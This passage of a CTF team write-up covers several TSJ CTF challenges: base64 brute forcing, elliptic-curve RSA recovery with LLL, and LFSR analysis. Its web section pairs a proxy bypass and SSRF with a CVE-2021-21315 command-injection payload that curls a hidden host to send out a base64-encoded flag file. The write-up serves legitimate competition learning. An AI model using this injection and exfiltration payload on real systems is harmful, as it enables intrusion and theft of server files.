+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> string
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;challenge/output.txt&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    c <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess</span>(m0<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, best<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+    res <span style="color:#f92672">=</span> []
+
+    <span style="color:#66d9ef">for</span> u <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable<span style="color:#f92672">.</span>encode():
+        m1 <span style="color:#f92672">=</span> m0 <span style="color:#f92672">+</span> bytes([u])
+        m <span style="color:#f92672">=</span> m1
+
+        <span style="color:#75715e"># Encodes the flag</span>
+        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+            m <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(m)
+        m <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>decode()
+
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(best, len(c)):
+            <span style="color:#66d9ef">if</span> m[i] <span style="color:#f92672">!=</span> c[i]: <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">assert</span> <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Done! The flag is </span><span style="color:#e6db74">{</span>m1<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+
+        res<span style="color:#f92672">.</span>append((i, u))
+        
+    res <span style="color:#f92672">=</span> sorted(res, reverse<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+    <span style="color:#66d9ef">if</span> res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> best: <span style="color:#66d9ef">return</span>
+    <span style="color:#66d9ef">for</span> best, b <span style="color:#f92672">in</span> res:
+        m1 <span style="color:#f92672">=</span> m0 <span style="color:#f92672">+</span> bytes([b])
+        guess(m1, best)
+        
+guess()
+<span style="color:#75715e"># TSJ{A_Truly_Cursed_Challenge_kekw_xDoeEf+AVg\XI[r`_w(S,~N2?Ba|tFRgsOvM]^ikhG&#34;jcW|z~n&amp; bCU$-qx4Z=;9/6lwLyzYm*TpuHQ.#Jj%1&gt;)P0!d3@}</span></code></pre></div>
+<h2 id="nimja-at-nantou">Nimja at Nantou<a hidden class="anchor" aria-hidden="true" href="#nimja-at-nantou">#</a></h2>
+
+<p><em>Solved by Kaiziron and Ozetta; writeup compiled by Kaiziron.</em></p>
+
+<p>This is a challenge about bypassing the proxy and exploiting an outdated NodeJS library which is vulnerable to command injection.</p>
+
+<p>The proxy will prevent some path to be accessed :</p>
+<pre tabindex="0"><code>map /hello-from-the-world/key http://127.0.0.1:80/forbidden
+map /hello-from-the-world/    http://127.0.0.1:80
+map /service-info/admin       http://127.0.0.1:5000/forbidden
+map /service-info/            http://127.0.0.1:5000/</code></pre>
+<p>To exploit the command injection, we have to first get the key.</p>
+
+<p>This path will return the key, if the request is made from <code>127.0.0.1</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nim" data-lang="nim">  get <span style="color:#e6db74">&#34;/&#34;</span>:
+    <span style="color:#66d9ef">var</span> jsonheader <span style="color:#f92672">=</span> parseJson(<span style="color:#f92672">$</span>request.headers.toJson)
+    <span style="color:#66d9ef">var</span> ip <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>request.ip
+
+    <span style="color:#75715e"># If x-forwarded-for exists</span>
+    <span style="color:#66d9ef">if</span> haskey(jsonheader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;table&#34;</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">&#34;x-forwarded-for&#34;</span>):
+      <span style="color:#66d9ef">var</span> ips <span style="color:#f92672">=</span> jsonheader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;table&#34;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#34;x-forwarded-for&#34;</span><span style="color:#f92672">]</span>
+      ip <span style="color:#f92672">=</span> ips<span style="color:#f92672">[</span>ips.len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>.str
+    
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>:
+      resp getkey()
+    <span style="color:#66d9ef">else</span>:
+      resp <span style="color:#e6db74">&#34;This is the index page.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Only local user can get the key.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span></code></pre></div>
+<p>In order to have a request made from <code>127.0.0.1</code>, we can make a POST request to <code>/get_hello</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nim" data-lang="nim">  post <span style="color:#e6db74">&#34;/get_hello&#34;</span>:
+    <span style="color:#66d9ef">var</span> jsonheader <span style="color:#f92672">=</span> parseJson(<span style="color:#f92672">$</span>request.params.toJson)
+    <span style="color:#66d9ef">var</span> host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">if</span> haskey(jsonheader, <span style="color:#e6db74">&#34;host&#34;</span>):
+      host <span style="color:#f92672">=</span> jsonheader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;host&#34;</span><span style="color:#f92672">]</span>.str
+
+    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+      <span style="color:#66d9ef">var</span> response <span style="color:#f92672">=</span> hello_from_the_world(host)
+      resp response
+    <span style="color:#66d9ef">else</span>:
+      resp <span style="color:#e6db74">&#34;Please provide the host so that they can say hello to you.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span></code></pre></div>
+<p>It can call the <code>hello_from_the_world</code> function, which will make the request to get the key we want, however it will append <code>hello</code> at the end of the URI :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nim" data-lang="nim"><span style="color:#66d9ef">proc </span><span style="color:#a6e22e">hello_from_the_world</span>(host: <span style="color:#66d9ef">string</span>): <span style="color:#66d9ef">string</span> <span style="color:#f92672">=</span>
+  <span style="color:#66d9ef">var</span> client <span style="color:#f92672">=</span> newHTTPClient(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>)
+  <span style="color:#66d9ef">var</span> uri <span style="color:#f92672">=</span> host <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;hello&#34;</span>
+  <span style="color:#66d9ef">var</span> response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+  <span style="color:#66d9ef">try</span>:
+    response <span style="color:#f92672">=</span> client.getContent(uri)
+  <span style="color:#66d9ef">except</span>:
+    response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Cannot fetch hello from your designated host.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+  <span style="color:#66d9ef">return</span> response</code></pre></div>
+<p>We can add a <code>?</code> at the end of the URI, so the <code>hello</code> it appended will be parsed as a parameter and won't affect the path.</p>
+<pre tabindex="0"><code>POST /hello-from-the-world/get_hello HTTP/1.1
+Host: 34.81.54.62:5487
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+host=http://localhost:80/?
+
+
+HTTP/1.1 200 OK
+Content-Length: 62
+Server: ATS/9.1.0
+Date: Sun, 27 Feb 2022 12:21:06 GMT
+Content-Type: text/html;charset=utf-8
+Age: 0
+Connection: keep-alive
+
+T$J_CTF_15_FUN_&gt;_&lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag</code></pre>
+<p>After getting the key, we can proceed to exploit the command injection.</p>
+
+<p>The <code>systeminformation</code> library is version 5.2.6.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#75715e">// cat package.json 
+</span><span style="color:#75715e"></span>{
+  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;service-info&#34;</span>,
+  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
+  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;The package is for service-info from Nimja at Nantou&#34;</span>,
+  <span style="color:#f92672">&#34;main&#34;</span>: <span style="color:#e6db74">&#34;app.js&#34;</span>,
+  <span style="color:#f92672">&#34;scripts&#34;</span>: {
+    <span style="color:#f92672">&#34;test&#34;</span>: <span style="color:#e6db74">&#34;echo \&#34;Error: no test specified\&#34; &amp;&amp; exit 1&#34;</span>
+  },
+  <span style="color:#f92672">&#34;author&#34;</span>: <span style="color:#e6db74">&#34;l3o&#34;</span>,
+  <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;ISC&#34;</span>,
+  <span style="color:#f92672">&#34;dependencies&#34;</span>: {
+    <span style="color:#f92672">&#34;systeminformation&#34;</span>: <span style="color:#e6db74">&#34;5.2.6&#34;</span>
+  }
+}</code></pre></div>
+<p>It is outdated and vulnerable to command injection</p>
+
+<p>More information about the vulnerability :
+<a href="https://vuldb.com/?id.169997">https://vuldb.com/?id.169997</a>
+<a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</a></p>
+
+<p>The <code>si.services()</code> function is vulnerable :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_services</span>(<span style="color:#a6e22e">service</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+        <span style="color:#a6e22e">si</span>.<span style="color:#a6e22e">services</span>(<span style="color:#a6e22e">service</span>)
+        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">res</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>());
+            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">res</span>(<span style="color:#e6db74">&#34;Failed&#34;</span>);
+        }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">error</span>);
+            <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;There is an error when fetching services.&#34;</span>);
+        })
+    });
+}</code></pre></div>
+<p>The <code>/admin</code> path will call that <code>get_services</code> function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/admin&#34;</span>) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>) {
+                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">body</span>) {
+                    <span style="color:#66d9ef">try</span> {
+                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jsonData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">body</span>);
+                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">service</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jsonData</span>.<span style="color:#a6e22e">service</span>;
+                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jsonData</span>.<span style="color:#a6e22e">key</span>;
+                    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+                        <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;ERROR&#34;</span>);
+                        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+                    }
+                }
+                
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">client_key</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">KEY</span>) {
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">return_data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">get_services</span>(<span style="color:#a6e22e">service</span>);
+                    <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">return_data</span>);
+                } <span style="color:#66d9ef">else</span> {
+                    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Key does not match.\n&#34;</span>);
+                    <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Only local users with the key can access the function.\n&#34;</span>);
+                }
+            }
+            <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;This is the admin page.\n&#34;</span>);
+            }
+        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/forbidden&#34;</span>) {
+            <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Only local user can access it.\n&#34;</span>);
+        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>) {
+            <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;This is the index page.\n&#34;</span>);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;404 Not Found\n&#34;</span>);
+        }</code></pre></div>
+<p>That <code>/admin</code> path is blocked by the proxy, but using double slash can bypass it  <code>/service-info//admin</code></p>
+
+<p>Then just follow this POC and exploit the command injection to read the flag :</p>
+
+<p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</a></p>
+<pre tabindex="0"><code>POST /service-info//admin HTTP/1.1
+Host: 34.81.54.62:5487
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 159
+
+{&#34;service&#34;:[&#34;$(curl http://REDACTED/`base64 /flag`)&#34;],
+&#34;key&#34;:&#34;T$J_CTF_15_FUN_&gt;_&lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag&#34;}
+
+
+
+
+GET /VFNKe0hSNV8xU19DMDAxX1hEX0wzdHNfZ29vb29vfQ== HTTP/1.1
+Host: REDACTED
+User-Agent: curl/7.64.0
+Accept: */*
+
+
+echo &#34;VFNKe0hSNV8xU19DMDAxX1hEX0wzdHNfZ29vb29vfQ==&#34; | base64 -d
+TSJ{HR5_1S_C001_XD_L3ts_gooooo}</code></pre>
+<h2 id="babyrsa">babyRSA<a hidden class="anchor" aria-hidden="true" href="#babyrsa">#</a></h2>
+
+<p><em>Solved by grhkm and Mystiz; writeup compiled by Mystiz.</em></p>
+
+<h3 id="challenge-summary">Challenge Summary<a hidden class="anchor" aria-hidden="true" href="#challenge-summary">#</a></h3>
+
+<p>Let $p$ and $q$ be two primes of respectively 1024 bits and 512 bits. Denote $n = pq$ and define the elliptic curve $\mathcal{C}$ by</p>
+
+<p><span  class="math">\[\mathcal{C}: \quad y^2 \equiv x^3 + px + q\ (\text{mod}\ n).\]</span></p>
+
+<p>Let $P = (x, y)$ be a point on $\mathcal{C}$ with $\text{flag}$ being 1536 bits long. Finally, we are given $Q$ with $Q = e \cdot P$ ($e = 65537$). The goal is to recover $x$ (the padded flag).</p>
+
+<h3 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h3>
+
+<p>Since $Q := (x_Q, y_Q)$ is on the elliptic curve $\mathcal{C}$, we have</p>
+
+<p><span  class="math">\[q + {x_Q}^3 - {y_Q}^2 + x_Q \cdot p \equiv 0\ (\text{mod}\ n).\]</span></p>
+
+<p>If we multiply both sides by $q$, we have an quadratic congruence in $q$:</p>
+
+<p><span  class="math">\[q^2 + ({x_Q}^3 - {y_Q}^2) \cdot q + x_Q \cdot n \equiv 0\ (\text{mod}\ n).\]</span></p>
+
+<p>Since $q$ and $n$ are respectively 512 and 1536 bits, we have more information than unknowns. We can use LLL to recover $q$.</p>
+
+<p>After that, we can recover $P$ over $\mathbb{Z}_p$ and $\mathbb{Z}_q$ by considering the below elliptic curves:</p>
+
+<p><span  class="math">\[\begin{aligned}
+& \mathcal{C}_p: \quad y^2 \equiv x^3 + px + q\ (\text{mod}\ p) \\
+& \mathcal{C}_q: \quad y^2 \equiv x^3 + px + q\ (\text{mod}\ q)
+\end{aligned}\]</span></p>
+
+<p>Also, it would be easy for Sage to compute the order of those elliptic curves. In that way, we can find $d_p$ and $d_q$ such that</p>
+
+<p><span  class="math">\[P = d_p \cdot Q\ (\text{mod}\ p) \quad \text{and} \quad P = d_q \cdot Q\ (\text{mod}\ q).\]</span></p>
+
+<p>Finally, we can use the Chinese remainder theorem to recover $P\ \text{mod}\ n$. We have the flag by getting its $x$-coordinate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">TSJ{i_don&#39;t_know_how_to_come_up_with_a_good_flag_sorry}</code></pre></div>
+<h4 id="solution-script-1">Solution script<a hidden class="anchor" aria-hidden="true" href="#solution-script-1">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+
+n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1084688440161525456565761297723021343753253859795834242323030221791996428064155741632924019882056914573754134213933081812831553364457966850480783858044755351020146309359045120079375683828540222710035876926280456195986410270835982861232693029200103036191096111928833090012465092747472907628385292492824489792241681880212163064150211815610372913101079146216940331740232522884290993565482822803814551730856710106385508489039042473394392081462669609250933566332939789</span>
+Qx, Qy <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1079311510414830031139310538989364057627185699077021276018232243092942690870213059161389825534830969580365943449482350229248945906866520819967957236255440270989833744079711900768144840591483525815244585394421988274792758875782239418100536145352175259508289748680619234207733291893262219468921233103016818320457126934347062355978211746913204921678806713434052571635091703300179193823668800062505275903102987517403501907477305095029634601150501028521316347448735695</span>, <span style="color:#ae81ff">950119069222078086234887613499964523979451201727533569872219684563725731563439980545934017421736344519710579407356386725248959120187745206708940002584577645674737496282710258024067317510208074379116954056479277393224317887065763453906737739693144134777069382325155341867799398498938089764441925428778931400322389280512595265528512337796182736811112959040864126090875929813217718688941914085732678521954674134000433727451972397192521253852342394169735042490836886</span>)
+
+load(<span style="color:#e6db74">&#39;coppersmith.sage&#39;</span>)
+
+bounds <span style="color:#f92672">=</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">512</span>, )
+
+P<span style="color:#f92672">.&lt;</span>q<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(Zmod(n), <span style="color:#ae81ff">1</span>)
+f <span style="color:#f92672">=</span> q<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> (Qy<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> Qx<span style="color:#f92672">^</span><span style="color:#ae81ff">3</span>)
+
+roots <span style="color:#f92672">=</span> small_roots(f, bounds, m<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>)
+<span style="color:#66d9ef">for</span> q0, <span style="color:#f92672">in</span> roots:
+    q0 <span style="color:#f92672">=</span> int(q0)
+
+    <span style="color:#66d9ef">if</span> q0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> q0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">continue</span>
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>q0 <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    p0 <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> q0
+    
+    Cp <span style="color:#f92672">=</span> EllipticCurve(Zmod(p0), [p0, q0])
+    op <span style="color:#f92672">=</span> Cp<span style="color:#f92672">.</span>order()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>op <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    dp <span style="color:#f92672">=</span> int(pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, op))
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>dp <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    Qp <span style="color:#f92672">=</span> Cp(Qx, Qy)
+    Pp <span style="color:#f92672">=</span> dp <span style="color:#f92672">*</span> Qp
+    
+    Cq <span style="color:#f92672">=</span> EllipticCurve(Zmod(q0), [p0, q0])
+    oq <span style="color:#f92672">=</span> Cq<span style="color:#f92672">.</span>order()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>oq <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    dq <span style="color:#f92672">=</span> int(pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, oq))
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>dq <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+    Qq <span style="color:#f92672">=</span> Cq(Qx, Qy)
+    Pq <span style="color:#f92672">=</span> dq <span style="color:#f92672">*</span> Qq
+
+    Ppx, Ppy <span style="color:#f92672">=</span> map(int, Pp<span style="color:#f92672">.</span>xy())
+    Pqx, Pqy <span style="color:#f92672">=</span> map(int, Pq<span style="color:#f92672">.</span>xy())
+
+    Px <span style="color:#f92672">=</span> int(crt([Ppx, Pqx], [p0, q0]))
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>Px <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(Px, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">1536</span>, n):
+        flag <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1536</span><span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>flag <span style="color:#e6db74">= }</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># TSJ{i_don&#39;t_know_how_to_come_up_with_a_good_flag_sorry}</span></code></pre></div>
+<h2 id="top-secret">Top Secret<a hidden class="anchor" aria-hidden="true" href="#top-secret">#</a></h2>
+
+<p><em>Solved by grhkm and Mystiz; writeup compiled by grhkm.</em></p>
+
+<p>We are given the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Cipher</span>:
+    bs <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+    s <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47</span>
+    k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5C2B76970103D4EEFCD4A2C681CC400D</span>
+
+    <span style="color:#66d9ef">def</span> __init__(self, key):
+        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_next</span>(self):
+        <span style="color:#75715e"># replacing fast_forward with forward works too</span>
+        self<span style="color:#f92672">.</span>s <span style="color:#f92672">=</span> fast_forward(self<span style="color:#f92672">.</span>s, self<span style="color:#f92672">.</span>key, self<span style="color:#f92672">.</span>k)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ks</span>(self, n):
+        ks <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+        <span style="color:#66d9ef">while</span> len(ks) <span style="color:#f92672">&lt;</span> n:
+            self<span style="color:#f92672">.</span>_next()
+            ks <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>to_bytes(self<span style="color:#f92672">.</span>bs, <span style="color:#e6db74">&#34;big&#34;</span>)
+        <span style="color:#66d9ef">return</span> ks[:n]
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(self, plaintext):
+        <span style="color:#66d9ef">return</span> bytes(x <span style="color:#f92672">^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(plaintext, self<span style="color:#f92672">.</span>ks(len(plaintext))))
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self, ciphertext):
+        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>encrypt(ciphertext)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(s, n, k):
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n):
+        s <span style="color:#f92672">=</span> (s <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> ((s <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> k)
+    <span style="color:#66d9ef">return</span> s
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    key <span style="color:#f92672">=</span> randbelow(<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">128</span>)
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag.png&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag.png.enc&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+        f<span style="color:#f92672">.</span>write(Cipher(key)<span style="color:#f92672">.</span>encrypt(data))</code></pre></div>
+<p>As we can see, it is a stream cipher where the flag is xor'ed by a stream with a fixed state <code>s</code>. First, note that the first $16$ bytes, and thus the entire first &quot;round&quot; of bits, can be recovered by xor'ing the encrypted flag with the PNG header and the IHDR chunk. Further analysing the <code>forward</code> function, we see that it is essentially a <em>Galois LFSR</em> - in short, each time the LFSR shifts, the entire state is xor'ed by a key <code>k</code>. If we now represent the state as a vector $\vec{s} \in \mathbb{F}_2^{128}$, we can see the forward operation is</p>
+
+<p><span  class="math">\[f: \begin{pmatrix} s_0 \\ s_1 \\ \vdots \\ s_{126} \\ s_{127} \end{pmatrix} \mapsto \begin{pmatrix} s_1 \\ s_2 \\ \vdots \\ s_{127} \\ 0 \end{pmatrix} \oplus s_0 \cdot \vec{k}\]</span></p>
+
